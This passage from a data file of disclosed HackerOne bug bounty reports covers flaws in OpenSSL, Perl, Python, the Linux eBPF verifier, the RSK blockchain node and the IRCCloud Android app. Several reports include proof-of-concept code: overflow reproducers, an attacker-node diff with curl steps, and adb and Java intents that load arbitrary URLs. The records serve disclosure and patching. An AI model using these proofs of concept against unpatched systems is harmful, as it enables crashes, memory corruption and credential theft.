12    res = EVP_CipherInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv, 1);
13    assert(res == 1);
14    int intmax = 2147483647;
15    void *inbuf = malloc(intmax);
16    void *outbuf = malloc((size_t)2147483648);
17    int outlen = 0;
18    unsigned char data[] = ""0"";
19    res = EVP_CipherUpdate(ctx, outbuf, &outlen, data, 1);
20    printf(""Processed %i bytes, outlen: %i, res: %i\n"", 1, outlen, res);
21    assert(res == 1);
22    outlen = 0;
23    res = EVP_CipherUpdate(ctx, outbuf, &outlen, (unsigned char
24*)inbuf, intmax);
25    assert(res == 1);
26    printf(""Processed %i bytes, outlen: %i, res: %i\n"", intmax, outlen, res);
27}
Impact
This returned negative output length, which, when combined with common use of pointer arithmetic in buffers results in accessing incorrect regions of memory (typically this would manifest as a segfault due to the size of the negative value, but that is not guaranteed).",https://hackerone.com/reports/1113025,No value,No value,No value,2021,2,27,21,14
Internet Bug Bounty,1-10,1.0,No value,"$2,500.00",No value,0.0,None,Malformed ECParameters causes infinite loop,"ctz  submitted a report to Internet Bug Bounty.Jun 11th (7 years ago)Malformed ECParameters causes infinite loop (CVE-2015-1788)
Severity: Moderate
When processing an ECParameters structure OpenSSL enters an infinite loop if the curve specified is over a specially malformed binary polynomial field.
This can be used to perform denial of service against any system which processes public keys, certificate requests or certificates.  This includes TLS clients and TLS servers with client authentication enabled.
This issue affects OpenSSL versions: 1.0.2 and 1.0.1. Recent 1.0.0 and 0.9.8 versions are not affected. 1.0.0d and 0.9.8r and below are affected.
OpenSSL 1.0.2 users should upgrade to 1.0.2b
OpenSSL 1.0.1 users should upgrade to 1.0.1n
OpenSSL 1.0.0d (and below) users should upgrade to 1.0.0s
OpenSSL 0.9.8r (and below) users should upgrade to 0.9.8zg
This issue was reported to OpenSSL on 6th April 2015 by Joseph Birr-Pixton. The fix was developed by Andy Polyakov of the OpenSSL development team.
http://jbp.io/2015/06/11/cve-2015-1788-openssl-binpoly-hang/",https://hackerone.com/reports/73241,No value,No value,No value,2015,6,11,0,0
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Critical,9.8,Integer Overflow,Integer overflow leading to buffer overflow,"jkrshnmenon  submitted a report to Internet Bug Bounty.Oct 15th (4 years ago)There exists an integer overflow in Perl_my_setenv @ util.c : 2070
2070: void Perlmy_setenv(pTHX const char nam, const char val) {
...
2166:         const int nlen = strlen(nam);
...
2171:         vlen = strlen(val);
2172:         new_env = (char)safesysmalloc((nlen + vlen + 2)  sizeof(char));
Here in a 64 bit version of Perl, since the arguments nam and val are user controlled, the 32 bit integers nlen and vlen are also under the control of the attacker. Therefore, if nam and val are two very long strings (for example, 2147483647 bytes long), the addition at line 2172 would result in an integer overflow.
The new_env would therefore be a chunk of a size which is smaller than the sum of the lengths of the two input strings.
This new_env is subsequently used in a call to memcpy to copy nlen bytes from nam followed by vlen bytes from val.
This results in a buffer overflow on the heap with attacker controlled input.
Please find attached a PoC which demonstrates the buffer overflow. Please note that the attached PoC consumes large amounts of memory and results in a segmentation fault on a 64 bit Ubuntu 16.04 system running a 64 bit version of perl.
This segmentation fault occurs due to the fact that the memcpy tries to write outside the initial heap boundary.
This vulnerability has been recognised as a serious security issue and has been assigned the identifier CVE-2018-18311 by the developers.
Impact
Memory corruption with attacker controlled input which can lead to arbitrary code execution1 attachment:F361142: test.pl",https://hackerone.com/reports/424447,No value,No value,No value,2018,10,15,23,30
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,5.6,Use After Free,Use-after-free in XML::LibXML::Node::replaceChild,"mipu94  submitted a report to Internet Bug Bounty.Aug 13th (5 years ago)Hi  security team,
I have reported a bug in Perl https://rt.cpan.org/Public/Bug/Display.html?id=122246 this bug was assigned CVE-2017-10672
https://nvd.nist.gov/vuln/detail/CVE-2017-10672",https://hackerone.com/reports/259390,No value,No value,No value,2017,8,13,9,36
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,None,bytearray.find Buffer Over-read,"johnleitch  submitted a report to Internet Bug Bounty.Jun 17th (7 years ago)http://bugs.python.org/issue24462  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded johnleitch with a $1,000 bounty. Dec 7th (7 years ago)",https://hackerone.com/reports/104023,No value,No value,No value,2015,6,17,0,0
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,None,audioop.adpcm2lin Buffer Over-read,johnleitch  submitted a report to Internet Bug Bounty.Jun 15th (7 years ago)http://bugs.python.org/issue24456  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded johnleitch with a $500 bounty. Dec 7th (7 years ago),https://hackerone.com/reports/104021,No value,No value,No value,2015,6,15,0,0
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,5.45,Memory Corruption - Generic,chain.__setstate__ Type Confusion,"johnleitch  submitted a report to Internet Bug Bounty.Oct 11th (6 years ago)Python 3.5.2 suffers from a type confusion vulnerability in the chain.setstate method of the itertools module. The issue exists due to lack of argument validation in the chain_setstate() function:
    static PyObject 
chain_setstate(chainobject lz, PyObject state)
{
PyObject source, *active=NULL;
        if (! PyArg_ParseTuple(state, ""O|O"", &source, &active))
return NULL;
        Py_INCREF(source);
Py_XSETREF(lz->source, source);
Py_XINCREF(active);
Py_XSETREF(lz->active, active);
Py_RETURN_NONE;
}
After parsing the argument tuple, source and active are set without validating that they are iterator objects. This causes issues elsewhere, where the values are passed PyIter_Next:
    static PyObject 
chain_next(chainobject lz)
{
PyObject *item;
        if (lz->source == NULL)
return NULL;                                    / already stopped /
        if (lz->active == NULL) {
PyObject iterable = PyIter_Next(lz->source);
if (iterable == NULL) {
Py_CLEAR(lz->source);
return NULL;                                / no more input sources /
}
lz->active = PyObject_GetIter(iterable);
Py_DECREF(iterable);
if (lz->active == NULL) {
Py_CLEAR(lz->source);
return NULL;                                / input not iterable /
}
}
item = PyIter_Next(lz->active);
if (item != NULL)
return item;
if (PyErr_Occurred()) {
if (PyErr_ExceptionMatches(PyExc_StopIteration))
PyErr_Clear();
else
return NULL;                                / input raised an exception /
}
Py_CLEAR(lz->active);
return chain_next(lz);                      / recurse and use next active */
}
In some cases, this can lead to a DEP access violation. It might be possible to exploit this to achieve code execution.
    (4074.198c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0132fa10 ecx=5b547028 edx=00000002 esi=0132fa10 edi=5b37b3e0
eip=00000000 esp=009ef940 ebp=009ef94c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
00000000 ??              ???
0:000> k6
ChildEBP RetAddr
WARNING: Frame IP not in any known module. Following frames may be wrong.
009ef93c 5b329ac0 0x0
009ef94c 5b2cb321 python35!PyIter_Next+0x10 [c:\build\cpython\objects\abstract.c @ 2778]
009ef960 5b37b42e python35!chain_next+0x21 [c:\build\cpython\modules\itertoolsmodule.c @ 1846]
009ef970 5b33fedd python35!wrap_next+0x4e [c:\build\cpython\objects\typeobject.c @ 5470]
009ef990 5b328b9d python35!wrapper_call+0x7d [c:\build\cpython\objects\descrobject.c @ 1195]
009ef9ac 5b3c463c python35!PyObject_Call+0x6d [c:\build\cpython\objects\abstract.c @ 2167]
To fix this issue, it is recommended that chain_setstate() be updated to validate its arguments. A proposed patch has been attached.
    static PyObject 
chain_setstate(chainobject lz, PyObject state)
{
PyObject source, *active=NULL;
        if (! PyArg_ParseTuple(state, ""O|O"", &source, &active))
return NULL;
        if (!PyIter_Check(source) || (active != NULL && !PyIter_Check(active))) {
PyErr_SetString(PyExc_ValueError, ""Arguments must be iterators."");
return NULL;
}
        Py_INCREF(source);
Py_XSETREF(lz->source, source);
Py_XINCREF(active);
Py_XSETREF(lz->active, active);
Py_RETURN_NONE;
}johnleitch   posted a comment. Oct 11th (6 years ago)Link to bug report: https://bugs.python.org/issue28322arice HackerOne staff  updated the severity from high to medium. Dec 3rd (6 years ago)arice HackerOne staff  closed the report and changed the status to Resolved. Dec 3rd (6 years ago)Internet Bug Bounty  rewarded johnleitch with a $1,000 bounty. Dec 3rd (6 years ago)johnleitch   requested to disclose this report. Dec 4th (6 years ago)arice HackerOne staff  agreed to disclose this report. Dec 5th (6 years ago)  This report has been disclosed. Dec 5th (6 years ago)",https://hackerone.com/reports/175091,No value,No value,No value,2016,10,11,8,14
Internet Bug Bounty,1-10,1.0,No value,$750.00,High,7.95,Privilege Escalation,[CVE-2020-27194] Linux kernel: eBPF verifier bug in `or` binary operation tracking function leads to LPE,"simonscannell  submitted a report to Internet Bug Bounty.Oct 16th (2 years ago)CVE-2020-27194 is a eBPF verifier bug that allows an unprivileged attacker to create BPF socket filter programs that can read and write Out of Bounds, trough which an arbitrary kernel read write can be achieved.
I'm taking the root cause explanation from the patch email:
Code 2.19 KiBWrap lines Copy Download1Simon reported an issue with the current scalar32_min_max_or() implementation.
2That is, compared to the other 32 bit subreg tracking functions, the code in
3scalar32_min_max_or() stands out that it's using the 64 bit registers instead
4of 32 bit ones. This leads to bounds tracking issues, for example:
5  [...]
6  8: R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R10=fp0 fp-8=mmmmmmmm
7  8: (79) r1 = *(u64 *)(r0 +0)
8   R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R10=fp0 fp-8=mmmmmmmm
9  9: R0=map_value(id=0,off=0,ks=4,vs=48,imm=0) R1_w=inv(id=0) R10=fp0 fp-8=mmmmmmmm
10  9: (b7) r0 = 1
11  10: R0_w=inv1 R1_w=inv(id=0) R10=fp0 fp-8=mmmmmmmm
12  10: (18) r2 = 0x600000002
13  12: R0_w=inv1 R1_w=inv(id=0) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
14  12: (ad) if r1 < r2 goto pc+1
15   R0_w=inv1 R1_w=inv(id=0,umin_value=25769803778) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
16  13: R0_w=inv1 R1_w=inv(id=0,umin_value=25769803778) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
17  13: (95) exit
18  14: R0_w=inv1 R1_w=inv(id=0,umax_value=25769803777,var_off=(0x0; 0x7ffffffff)) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
19  14: (25) if r1 > 0x0 goto pc+1
20   R0_w=inv1 R1_w=inv(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
21  15: R0_w=inv1 R1_w=inv(id=0,umax_value=0,var_off=(0x0; 0x7fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
22  15: (95) exit
23  16: R0_w=inv1 R1_w=inv(id=0,umin_value=1,umax_value=25769803777,var_off=(0x0; 0x77fffffff),u32_max_value=2147483647) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
24  16: (47) r1 |= 0
25  17: R0_w=inv1 R1_w=inv(id=0,umin_value=1,umax_value=32212254719,var_off=(0x1; 0x700000000),s32_max_value=1,u32_max_value=1) R2_w=inv25769803778 R10=fp0 fp-8=mmmmmmmm
26  [...]
27
28The bound tests on the map value force the upper unsigned bound to be 25769803777
29in 64 bit (0b11000000000000000000000000000000001) and then lower one to be 1. By
30using OR they are truncated and thus result in the range [1,1] for the 32 bit reg
31tracker. This is incorrect given the only thing we know is that the value must be
32positive and thus 2147483647 (0b1111111111111111111111111111111) at max for the
33subregs. Fix it by using the {u,s}32_{min,max}_value vars instead
The issue was introduced with commit https://github.com/torvalds/linux/commit/3f50f132d8400e129fc9eb68b5020167ef80a244 and patched with commit https://github.com/torvalds/linux/commit/5b9fbeb75b6a98955f628e205ac26689bcb1383e
This means the kernel 5.8. stable branch was affected by the vulnerability. I wrote a highly reliable LPE exploit for Fedora 33, which used the 5.8. kernel. Next, week, on october 22nd Ubuntu 22.10 is released which would have been vulnerable as well if I had not reported the vulnerability. Effectively, all distributions could have become affected.
Here is a video demonstration of the exploit in action:
Video F1039500: exploit.mp4 573.76 KiBZoom in Zoom out Copy Download
I will publish the exploit after some time has passed.
Impact
This vulnerability allows for an extremely reliable exploit leading to LPE on default configurations for many distros such as Ubuntu, Debian, Fedora and more.1 attachment:F1039500: exploit.mp4",https://hackerone.com/reports/1010340,No value,No value,No value,2020,10,16,20,23
IOVLabs,11-50,0.0,10m-50m,"$10,000.00",Critical,9.3,Deserialization of Untrusted Data,Attacker can add arbitrary data to the blockchain without paying gas,"ahook  submitted a report to IOVLabs.Aug 19th (4 years ago)Summary:
Due to a missing sanity check in Transaction::rlpParse, an attacker can append arbitrary RLP-encoded data to the end of an otherwise valid transaction, and that data will not only pass through validation, but also be propagated throug the network and mined into a block. Since the block parser uses the same code for decoding transactions (as it should), the block will also be conidered valid.
Description:
The issue stems from the Transaction::rlpParse function:
https://github.com/rsksmart/rskj/blob/master/rskj-core/src/main/java/org/ethereum/core/Transaction.java#L242
Once all the relevant data is pulled from the decoded RLP, there are no checks to ensure that we've reached the end of the data.
Since the transaction is constructed using the raw encoded bytes, any future calls to getEncoded() will return the entire byte array, including the bad data at the end. Signature verification of the valid transaction will still pass because it uses getRawEncoded() to compute the signature, which ignores the extra data.
Steps To Reproduce:
On a remote server I start up a regtest node from a clean codebase. This will begin mining as a single-node network:
Code 123 BytesWrap lines Copy Download1remote:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
On my local machine, I start another regtest node but I modify the config to a) talk to my remote node, and b) not mine. I don't mine on this node because I will be using it to manufacture beefy transactions and I want to make sure that other, clean nodes will accept/mine these transactions.
In addition to the config changes, I have also modified the eth_sendTransaction code to add extra rlp-encoded bytes to the end of the transaction. In order to easily see the data in a hex blob, I'm just setting it to a repeated 0xbeef string. I've also hacked the getBlockByHash function to return the full encoded hex block in the extraData field, as a quick way to query and see the raw block data.
Code 5.97 KiBWrap lines Copy Download1local:~/rskj$ # Start the attacker's node:
2local:~/rskj$ java -Dblockchain.config.name=regtest -cp rskj-core/build/libs/rskj-core-0.5.0-SNAPSHOT-all.jar co.rsk.Start
3local:~/rskj$
4local:~/rskj$ # Create a new account:
5local:~/rskj$ curl -s -X POST -H ""Content-Type: application/json"" -d '{""jsonrpc"":""2.0"",""method"":""personal_newAccount"", ""params"": [""beef""], ""id"":666}' http://127.0.0.1:4444/
6{""jsonrpc"":""2.0"",""id"":666,""result"":""0x0e016bdab929a365c7419ba51d0902cbde6035c2""}
7local:~/rskj$
8local:~/rskj$ # Send a transaction:
9local:~/rskj$ curl -s -X POST -H ""Content-Type: application/json"" -d '{""jsonrpc"":""2.0"",""method"":""eth_sendTransaction"", ""params"": [{""from"": ""0xCd2a3d9f938e13Cd947eC05ABC7fe734df8DD826"", ""to"":""0x0e016bdab929a365c7419ba51d0902cbde6035c2"", ""gas"":""0x76c0"", ""gasPrice"": ""0x9184e72a000"", ""value"":""0x9184e72a""}], ""id"":666}' http://127.0.0.1:4444/
10{""jsonrpc"":""2.0"",""id"":666,""result"":""0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301""}
11local:~/rskj$
12local:~/rskj$ # Wait for the transaction to propagate to the remote server and be mined
13local:~/rskj$ # Then check the receipt to see that it made it into the block:
14local:~/rskj$ $ curl -s -X POST -H ""Content-Type: application/json"" -d '{""jsonrpc"":""2.0"",""method"":""eth_getTransactionReceipt"", ""params"": [""0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301""], ""id"":666}' http://127.0.0.1:4444/
15{""jsonrpc"":""2.0"",""id"":666,""result"":{""transactionHash"":""0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"",""transactionIndex"":""0x0"",""blockHash"":""0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747"",""blockNumber"":""0x681"",""cumulativeGasUsed"":""0x5208"",""gasUsed"":""0x5208"",""contractAddress"":null,""logs"":[],""from"":""0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826"",""to"":""0x0e016bdab929a365c7419ba51d0902cbde6035c2"",""root"":""0x01"",""status"":""0x01""}}
16local:~/rskj$
17local:~/rskj$ # Now that we see our beefy transaction in the block, look up the raw block
18local:~/rskj$ curl -s -X POST -H ""Content-Type: application/json"" -d '{""jsonrpc"":""2.0"",""method"":""eth_getBlockByHash"", ""params"": [""0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747"", true], ""id"":666}' http://127.0.0.1:4444/
19{""jsonrpc"":""2.0"",""id"":666,""result"":{""number"":""0x681"",""hash"":""0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747"",""parentHash"":""0x6101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4b"",""sha3Uncles"":""0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347"",""logsBloom"":""0x00000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000"",""transactionsRoot"":""0x5e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4"",""stateRoot"":""0xcacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2"",""receiptsRoot"":""0x3f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabb"",""miner"":""0xec4ddeb4380ad69b3e509baad9f158cdf4e4681d"",""difficulty"":""0x01"",""totalDifficulty"":""0x682"",""extraData"":""0xf90383f902dba06101456ae392aeb4dfca1377cca9b407237eab308f079fe0e40d4f8533e5cf4ba01dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d4934794ec4ddeb4380ad69b3e509baad9f158cdf4e4681da0cacaa63cbd707618051669ea88c76aeeb82105f8adad76c7682f8a039b4e07d2a05e5bb633946b0b6a4c7e3128c6b12d6fdefc66b0dc925cea6d090c6dbdbb61e4a03f0773010b81c896ca4c9cccf6e69e0f3f32d62b82c23a957996d60c4104fabbb9010000000000000000000000000000000000000000002000000000200000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000100000080000000000000000000000000000080000000000000000000000000000000000000008000000000000000000000000000000000010000000000000000000000080000000100000020000000000000000000000000000001000000000020000000001000000000000018000000000000020000000000000200040100000000000000000000000000000000000000000000000000000000000000000000000018206818367c280825208845b78fd12808802ea11e32ad500000080b8507111010000000000000000000000000000000000000000000000000000000000000000009b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe12fd785bffff7f21670b0000a701000000019b6a3f2b95038fc2feba8c3641be2bfcc67ea6ea48519697a9ea0c1ab9ccbfbe0101b886000000000000040048d9465430728a2ba7f23b2792c24eaf61e134c8dafa6ec0fce944569ae2f7b752534b424c4f434b3aa74eb3b1efd29c88b6b250faa51e599dcf38b6bcf9080e0252cbf7574a29b54fffffffff0100f2052a01000000232103d3b2d67927fcbe6ea4f629d14f5938f6209186036e45833c3d51b3df80aab53aac00000000f8a2f880018609184e72a0008276c0940e016bdab929a365c7419ba51d0902cbde6035c2849184e72a8066a016e1fffd39de05273881dd8e2720664898bf28b34b57c568689eb3b969381d5aa05f157a0d01506a05685a2b9d4d74eb01b27486b00f6c3ac9823f1f6e12c732aa96beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeefdf82068000009400000000000000000000000000000000010000088080808080c0"",""size"":""0x386"",""gasLimit"":""0x67c280"",""gasUsed"":""0x5208"",""timestamp"":""0x5b78fd12"",""transactions"":[{""hash"":""0x26ef60114e110258b1f6427042345c401068c9c666e0782f3d597c73ef1eb301"",""nonce"":""0x01"",""blockHash"":""0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747"",""blockNumber"":""0x681"",""transactionIndex"":""0x0"",""from"":""0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826"",""to"":""0x0e016bdab929a365c7419ba51d0902cbde6035c2"",""gas"":""0x76c0"",""gasPrice"":""0x09184e72a000"",""value"":""0x009184e72a"",""input"":""0x00""},{""hash"":""0xa703402c0c77c41597a09088c0ef3c61bb608da4683f4de8b1a3569297a61b25"",""nonce"":""0x0680"",""blockHash"":""0x2d1333a31807d2ce3f058bf8ffe10a343b6d8fc59b7a918c3004fd1e46880747"",""blockNumber"":""0x681"",""transactionIndex"":""0x1"",""from"":""0x0000000000000000000000000000000000000000"",""to"":""0x0000000000000000000000000000000001000008"",""gas"":""0x00"",""gasPrice"":""0x00"",""value"":""0"",""input"":""0x00""}],""uncles"":[],""minimumGasPrice"":""0""}}
Sorry for the giant data dump there, but if you take a look at the extraData in the returned block (which is actually the full block hex because of the hacked code), you can see that the ""beefbeefbeefbeef"" data made it in.
This is a proof that a malicious node (my local node) can craft a transaction with extra data appended, share that transaction with the network via the normal p2p process, and have the extra data mined into a block.
Here's the full diff for the attacker/local node. Sorry again, it's a little hacky. I could have used the eth_sendRawTransaction endpoint, but I didn't want to go through the process of hand-constructing the rlp-encoded data:
Code 4.00 KiBWrap lines Copy Download1diff --git a/rskj-core/src/main/java/org/ethereum/core/Transaction.java b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
2index bbd21ee..801e18d 100644
3--- a/rskj-core/src/main/java/org/ethereum/core/Transaction.java
4+++ b/rskj-core/src/main/java/org/ethereum/core/Transaction.java
5@@ -164,7 +164,7 @@ public class Transaction {
6     }
7 
8     public Transaction toImmutableTransaction() {
9-        return new ImmutableTransaction(this.getEncoded());
10+        return new ImmutableTransaction(this.getBeefyEncoded());
11     }
12 
13     private byte extractChainIdFromV(byte v) {
14@@ -516,7 +516,17 @@ public class Transaction {
15         return rlpRaw;
16     }
17 
18+    // Clear the rlpEncoded if present, and re-encode with extra 0xbeef data
19+    public byte[] getBeefyEncoded() {
20+        rlpEncoded = null;
21+        return getEncodedInternal(""beefbeefbeefbeefbeefbeefbeefbeefbeefbeefbeef"");
22+    }
23+
24     public byte[] getEncoded() {
25+        return getEncodedInternal(null);
26+    }
27+    private byte[] getEncodedInternal(String beef) {
28         if (rlpEncoded != null) {
29             return rlpEncoded;
30         }
31@@ -556,8 +566,15 @@ public class Transaction {
32             s = RLP.encodeElement(EMPTY_BYTE_ARRAY);
33         }
34 
35-        this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
36-                toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
37+        // if 0xbeef bytes are present, tack them on at the end of the tx
38+        if (beef != null) {
39+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
40+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s,
41+                    RLP.encodeElement(Hex.decode(beef)));
42+        } else {
43+            this.rlpEncoded = RLP.encodeList(toEncodeNonce, toEncodeGasPrice, toEncodeGasLimit,
44+                    toEncodeReceiveAddress, toEncodeValue, toEncodeData, v, r, s);
45+        }
46 
47         Keccak256 hash = this.getHash();
48         this.hash = hash == null ? null : hash.getBytes();
49diff --git a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
50index 04d0ddb..ad0f3c1 100644
51--- a/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
52+++ b/rskj-core/src/main/java/org/ethereum/rpc/Web3Impl.java
53@@ -599,7 +599,8 @@ public class Web3Impl implements Web3 {
54         br.miner = isPending ? null : TypeConverter.toJsonHex(b.getCoinbase().getBytes());
55         br.difficulty = TypeConverter.toJsonHex(b.getDifficulty().getBytes());
56         br.totalDifficulty = TypeConverter.toJsonHex(this.blockchain.getBlockStore().getTotalDifficultyForHash(b.getHash().getBytes()).asBigInteger());
57-        br.extraData = TypeConverter.toJsonHex(b.getExtraData());
58+        // hacky, for testing, return the full encoded block instead of extraData
59+        br.extraData = TypeConverter.toJsonHex(b.getEncoded());
60         br.size = TypeConverter.toJsonHex(b.getEncoded().length);
61         br.gasLimit = TypeConverter.toJsonHex(b.getGasLimit());
62         Coin mgp = b.getMinimumGasPrice();
63diff --git a/rskj-core/src/main/resources/config/regtest.conf b/rskj-core/src/main/resources/config/regtest.conf
64index df111fa..1e81a7c 100644
65--- a/rskj-core/src/main/resources/config/regtest.conf
66+++ b/rskj-core/src/main/resources/config/regtest.conf
67@@ -8,12 +8,13 @@ peer {
68         # the peer window will show
69         # only what retrieved by active
70         # peer [true/false]
71-        enabled = false
72+        enabled = true
73 
74         # List of the peers to start
75         # the search of the online peers
76         # values: [ip:port]
77-        ip.list = [ ]
78+        # replace <target_ip> with the ""real"" network node that will be mining
79+        ip.list = [""<target_ip>:50501""]
80     }
81 
82     # Port for server to listen for incoming connections
83@@ -24,7 +25,8 @@ peer {
84 }
85 
86 miner {
87-    server.enabled = true
88+    # Attacker node won't mine, so we know the tx propagated through the network
89+    server.enabled = false
90     client.enabled = true
91     minGasPrice = 0
Impact
The attacker can add arbitrary data into the blockchain without paying the requisite gas or undergoing any validation of the extra data.
I can think of three ways to get this data into the system: 1) the method I detailed in the above PoC, in which the attacker creates a valid transaction and adds the data, 2) a malicious miner could just add the data to any valid transaction it has in its pool; 3) an attacker could wait for new pending transactions to appear, then add their data and send the tx back to the network. If the attacker's version of the tx makes it to the miner that produces the next block, the data will make it to the chain without the attacker even needing to create their own valid tx.
I have not checked to see how much data can be appended, but I assume its limited only by whatever overall block/transaction/message size constraints exist.",https://hackerone.com/reports/396954,Buenos Aires,Argentina,Buenos Aires,2018,8,19,6,5
IRCCloud,11-50,0.0,under-1m,$150.00,Medium,5.45,None,[IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity,"bagipro  submitted a report to IRCCloud.Oct 26th (5 years ago)Hi, I'd like to report a bug which allow to open arbitrary URLs in com.irccloud.android.activity.SAMLAuthActivity
This activity is exported:
Code 371 BytesWrap lines Copy Download1        <activity android:name=""com.irccloud.android.activity.SAMLAuthActivity"" android:theme=""@style/dawn"" android:windowSoftInputMode=""adjustResize"">
2            <intent-filter>
3                <action android:name=""android.intent.action.VIEW""/>
4                <category android:name=""android.intent.category.DEFAULT""/>
5            </intent-filter>
6        </activity>
it means that it can be accessed by any third-party apps installed on the same device. On the newest Androids it also could be exploited by Android Instant Apps directly from a web-browser.
In file    can see that it opens attacker provided URLs
Code 271 BytesWrap lines Copy Download1        if (getIntent() == null || !getIntent().hasExtra(""auth_url"")) {
2            finish();
3            return;
4        }
5        getSupportActionBar().setTitle(getIntent().getStringExtra(""title""));
6        this.mWebView.loadUrl(getIntent().getStringExtra(""auth_url""));
PoC from ADB:
Code 142 BytesWrap lines Copy Download1adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity -e title ""ATTAAACK"" -e auth_url ""http://google.com/""
PoC in Java:
Code 276 BytesWrap lines Copy Download1        Intent intent = new Intent();
2        intent.setClassName(""com.irccloud.android"", ""com.irccloud.android.activity.SAMLAuthActivity"");
3        intent.putExtra(""title"", ""ATTAAACK"");
4        intent.putExtra(""auth_url"", ""http://google.com/"");
5        startActivity(intent);
Result:
Image F233002: 2017-10-26_14-17-33.jpg 173.48 KiBZoom in Zoom out Copy Download
Image F233003: 2017-10-26_14-15-36.jpg 121.03 KiBZoom in Zoom out Copy Download
It's dangerous because user doesn't see real URL. Attacker can open anything and specify any title (like ""IRCCloud: Login Required""), and using that trick steal user credentials.
You can test this issue by yourself, APK is attached3 attachments:F233002: 2017-10-26_14-17-33.jpgF233003: 2017-10-26_14-15-36.jpgF233005: app-release.apkjwheare IRCCloud staff  closed the report and changed the status to Resolved. Oct 26th (5 years ago)Thanks very much for this report. We've fixed this issue by preventing this activity from being exported:
https://github.com/irccloud/android/commit/8ff145519bcd30da1898dd54a68629f53c62afe7IRCCloud  rewarded bagipro with a $150 bounty. Oct 26th (5 years ago)bagipro   requested to disclose this report. Oct 26th (5 years ago)Cool, thanks. Can we disclose?jwheare IRCCloud staff  agreed to disclose this report. Nov 3rd (5 years ago)  This report has been disclosed. Nov 3rd (5 years ago)",https://hackerone.com/reports/283058,England,United Kingdom,London,2017,10,26,11,30
IRCCloud,11-50,0.0,under-1m,$500.00,High,7.95,Privacy Violation,[IRCCloud Android] Theft of arbitrary files leading to token leakage,"bagipro  submitted a report to IRCCloud.Nov 9th (5 years ago)Bug description#
Hi, I'd like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest https://hackerone.com/reports/161710
This one is really tricky, passed two days to realize how to exploit that ;)
Activity com.irccloud.android.activity.ShareChooserActivity is exported and designed to allow file sharing from third-party apps to IRC Cloud
Code 969 BytesWrap lines Copy Download1        <activity android:excludeFromRecents=""true"" android:name=""com.irccloud.android.activity.ShareChooserActivity"" android:theme=""@style/dawnDialog"">
2            <intent-filter>
3                <action android:name=""android.intent.action.VIEW""/>
4                <category android:name=""android.intent.category.DEFAULT""/>
5            </intent-filter>
6            <intent-filter>
7                <action android:name=""android.intent.action.SEND""/>
8                <category android:name=""android.intent.category.DEFAULT""/>
9                <data android:mimeType=""application/*""/>
10                <data android:mimeType=""audio/*""/>
11                <data android:mimeType=""image/*""/>
12                <data android:mimeType=""text/*""/>
13                <data android:mimeType=""video/*""/>
14            </intent-filter>
